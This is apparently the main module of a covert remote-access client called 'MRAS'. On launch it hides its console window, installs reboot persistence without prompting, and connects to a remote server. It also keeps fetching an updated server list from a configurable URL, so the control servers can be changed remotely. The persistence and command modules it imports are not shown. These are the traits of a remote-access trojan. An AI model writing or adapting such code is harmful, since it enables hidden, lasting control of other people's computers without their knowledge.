"""
MRAS Client — remote agent.
Runs silently in the background, survives reboots, reconnects automatically.
"""
from __future__ import annotations
import asyncio
import logging
import logging.handlers
import os
import sys
from pathlib import Path

import yaml

# ── Bootstrap sys.path before any local imports ──────────────────────────────
if getattr(sys, "frozen", False):
    # PyInstaller: add the exe's directory so 'client', 'shared', 'server'
    # packages are importable (they were extracted to _MEIPASS automatically,
    # but EXE_DIR must also be on sys.path for the config helper).
    _exe_dir = Path(sys.executable).parent
else:
    _exe_dir = Path(__file__).resolve().parents[1]

if str(_exe_dir) not in sys.path:
    sys.path.insert(0, str(_exe_dir))

from client.paths import config_path, log_dir, EXE_DIR
from client.persistence import hide_console, install, is_installed
from client.connection import ClientConnection


def load_config() -> dict:
    path = config_path()
    if not path.exists():
        raise FileNotFoundError(
            f"config.yaml not found at {path}\n"
            f"Make sure the 'client' folder with config.yaml is next to the exe."
        )
    with open(path, encoding="utf-8") as f:
        cfg = yaml.safe_load(f)
    cfg["client"]["secret"] = os.environ.get("MRAS_SECRET", cfg["client"]["secret"])
    return cfg


def setup_logging(cfg: dict) -> None:
    lc = cfg["logging"]
    log_file = log_dir() / Path(lc["file"]).name
    level = getattr(logging, lc["level"].upper(), logging.INFO)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    fh = logging.handlers.RotatingFileHandler(
        str(log_file), maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
    )
    fh.setFormatter(logging.Formatter(fmt))
    handlers: list[logging.Handler] = [fh]
    if sys.stdout and sys.stdout.isatty():
        handlers.append(logging.StreamHandler())
    logging.basicConfig(level=level, format=fmt, handlers=handlers)


async def config_update_loop(cfg: dict) -> None:
    """Periodically fetch an updated server list from a remote URL."""
    url: str = cfg["client"].get("config_update_url", "")
    interval: int = cfg["client"].get("config_update_interval", 300)
    if not url:
        return
    while True:
        await asyncio.sleep(interval)
        try:
            import json, urllib.request
            with urllib.request.urlopen(url, timeout=10) as resp:
                data = json.loads(resp.read())
            servers = data.get("servers", [])
            if servers:
                from client.commands.change_server import _update_servers
                _update_servers(servers)
                logging.getLogger("mras.client").info("Config update applied: %s", servers)
        except Exception as exc:
            logging.getLogger("mras.client").debug("Config update failed: %s", exc)


async def main() -> None:
    hide_console()

    cfg = load_config()
    setup_logging(cfg)
    log = logging.getLogger("mras.client")
    log.info("MRAS Client starting — base dir: %s", EXE_DIR)

    if not is_installed():
        if install():
            log.info("Persistence installed successfully")
        else:
            log.warning("Persistence installation failed")

    conn = ClientConnection(cfg)
    await asyncio.gather(
        conn.run(),
        config_update_loop(cfg),
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
